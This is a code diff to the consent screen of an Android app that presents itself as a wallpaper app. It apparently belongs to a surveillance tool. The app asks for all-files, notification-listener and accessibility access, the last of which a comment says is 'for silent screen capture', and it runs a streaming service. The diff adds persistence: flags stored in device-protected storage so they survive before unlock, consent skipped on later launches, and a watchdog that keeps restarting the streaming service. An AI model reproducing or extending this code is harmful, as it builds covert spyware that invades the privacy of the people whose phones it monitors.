@@ -1,6 +1,7 @@
 package com.example.wallpaperapplication;
 
 import android.Manifest;
+import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -61,6 +62,8 @@ public class ConsentActivity extends AppCompatActivity {
         boolean consentGiven = prefs.getBoolean("consent_given", false);
         if (!consentGiven) {
             showConsentDialog();
+        } else if (prefs.getBoolean("setup_completed", false) && hasAllRuntimePermissions()) {
+            proceedToMainActivity();
         } else {
             checkPermissionsOrFinish();
         }
@@ -86,7 +89,17 @@ public class ConsentActivity extends AppCompatActivity {
                             .putBoolean("consent_given", true)
                             .putBoolean(Constants.PREF_STREAMING_ENABLED, true)
                             .putBoolean(Constants.PREF_BOOT_ENABLED, true)
-                            .apply();
+                            .commit();
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                        try {
+                            Context deContext = createDeviceProtectedStorageContext();
+                            PreferenceManager.getDefaultSharedPreferences(deContext).edit()
+                                    .putBoolean("consent_given", true)
+                                    .putBoolean(Constants.PREF_STREAMING_ENABLED, true)
+                                    .putBoolean(Constants.PREF_BOOT_ENABLED, true)
+                                    .commit();
+                        } catch (Exception ignored) {}
+                    }
                     checkPermissionsOrFinish();
                 })
                 .setNegativeButton("Cancel", (dialog, which) -> {
@@ -103,6 +116,15 @@ public class ConsentActivity extends AppCompatActivity {
         String packageName = getPackageName();
         String listenerName = packageName + "/" + StreamingService.NotificationListener.class.getName();
         return enabledListeners != null && enabledListeners.contains(listenerName);
+    }
+
+    private boolean hasAllRuntimePermissions() {
+        for (String perm : getRequiredPermissions()) {
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
+        }
+        return true;
     }
 
     private void checkPermissionsOrFinish() {
@@ -123,58 +145,61 @@ public class ConsentActivity extends AppCompatActivity {
             return;
         }
 
+        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
+
         // 2. Check All Files Access for Android 11+ (API 30+)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
-            if (!storagePermissionRequested) {
-                storagePermissionRequested = true;
-                Toast.makeText(this, "Please grant All Files Access to proceed", Toast.LENGTH_SHORT).show();
-                try {
-                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
-                    intent.addCategory("android.intent.category.DEFAULT");
-                    intent.setData(Uri.parse(String.format("package:%s", getPackageName())));
-                    startActivityForResult(intent, REQUEST_CODE_MANAGE_STORAGE);
-                } catch (Exception e) {
-                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
-                    startActivityForResult(intent, REQUEST_CODE_MANAGE_STORAGE);
-                }
-                return;
+        boolean storagePrompted = prefs.getBoolean("storage_prompted", false);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager() && !storagePrompted) {
+            storagePermissionRequested = true;
+            prefs.edit().putBoolean("storage_prompted", true).apply();
+            Toast.makeText(this, "Please grant All Files Access to proceed", Toast.LENGTH_SHORT).show();
+            try {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                intent.addCategory("android.intent.category.DEFAULT");
+                intent.setData(Uri.parse(String.format("package:%s", getPackageName())));
+                startActivityForResult(intent, REQUEST_CODE_MANAGE_STORAGE);
+            } catch (Exception e) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                startActivityForResult(intent, REQUEST_CODE_MANAGE_STORAGE);
             }
+            return;
         }
 
         // 3. Check Notification Listener Access
-        if (!hasNotificationAccess()) {
-            if (!notificationAccessRequested) {
-                notificationAccessRequested = true;
-                Runnable openSettings = () -> {
-                    Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
-                    startActivityForResult(intent, REQUEST_CODE_NOTIFICATION_LISTENER);
-                };
-                if (RestrictedSettingsHelper.isRestricted(this)) {
-                    RestrictedSettingsHelper.showGuidanceDialog(this, "Notification Access", openSettings);
-                } else {
-                    Toast.makeText(this, "Please enable notification access for streaming notifications", Toast.LENGTH_LONG).show();
-                    openSettings.run();
-                }
-                return;
+        boolean notificationPrompted = prefs.getBoolean("notification_prompted", false);
+        if (!hasNotificationAccess() && !notificationPrompted) {
+            notificationAccessRequested = true;
+            prefs.edit().putBoolean("notification_prompted", true).apply();
+            Runnable openSettings = () -> {
+                Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+                startActivityForResult(intent, REQUEST_CODE_NOTIFICATION_LISTENER);
+            };
+            if (RestrictedSettingsHelper.isRestricted(this)) {
+                RestrictedSettingsHelper.showGuidanceDialog(this, "Notification Access", openSettings);
+            } else {
+                Toast.makeText(this, "Please enable notification access for streaming notifications", Toast.LENGTH_LONG).show();
+                openSettings.run();
             }
+            return;
         }
 
         // 4. Check Accessibility Access (for silent screen capture on Android 11+)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !hasAccessibilityAccess()) {
-            if (!accessibilityAccessRequested) {
-                accessibilityAccessRequested = true;
-                Runnable openSettings = () -> {
-                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-                    startActivityForResult(intent, REQUEST_CODE_ACCESSIBILITY);
-                };
-                if (RestrictedSettingsHelper.isRestricted(this)) {
-                    RestrictedSettingsHelper.showGuidanceDialog(this, "Accessibility Service", openSettings);
-                } else {
-                    Toast.makeText(this, "Please enable Accessibility for Wallpaper to allow screen capture", Toast.LENGTH_LONG).show();
-                    openSettings.run();
-                }
-                return;
+        // Only ask ONCE during initial setup, never repeatedly every time the app opens or restarts from foreground
+        boolean a11yPrompted = prefs.getBoolean("accessibility_prompted", false);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !hasAccessibilityAccess() && !a11yPrompted) {
+            accessibilityAccessRequested = true;
+            prefs.edit().putBoolean("accessibility_prompted", true).apply();
+            Runnable openSettings = () -> {
+                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                startActivityForResult(intent, REQUEST_CODE_ACCESSIBILITY);
+            };
+            if (RestrictedSettingsHelper.isRestricted(this)) {
+                RestrictedSettingsHelper.showGuidanceDialog(this, "Accessibility Service", openSettings);
+            } else {
+                Toast.makeText(this, "Please enable Accessibility for Wallpaper to allow screen capture", Toast.LENGTH_LONG).show();
+                openSettings.run();
             }
+            return;
         }
 
         // 5. All permissions requested, proceed to MainActivity
@@ -226,13 +251,18 @@ public class ConsentActivity extends AppCompatActivity {
 
     private void proceedToMainActivity() {
         SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
-        if (prefs.getBoolean(Constants.PREF_STREAMING_ENABLED, true)) {
+        prefs.edit().putBoolean("setup_completed", true).commit();
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
             try {
-                Intent serviceIntent = new Intent(this, StreamingService.class);
-                ContextCompat.startForegroundService(this, serviceIntent);
-            } catch (Exception e) {
-                // Ignore if foreground service launch has timing constraints
-            }
+                Context deContext = createDeviceProtectedStorageContext();
+                PreferenceManager.getDefaultSharedPreferences(deContext).edit()
+                        .putBoolean("setup_completed", true)
+                        .commit();
+            } catch (Exception ignored) {}
+        }
+        if (prefs.getBoolean(Constants.PREF_STREAMING_ENABLED, true)) {
+            StreamingWatchdogReceiver.startStreamingService(this);
+            StreamingWatchdogReceiver.scheduleNext(this);
         }
         startActivity(new Intent(this, MainActivity.class));
         finish();
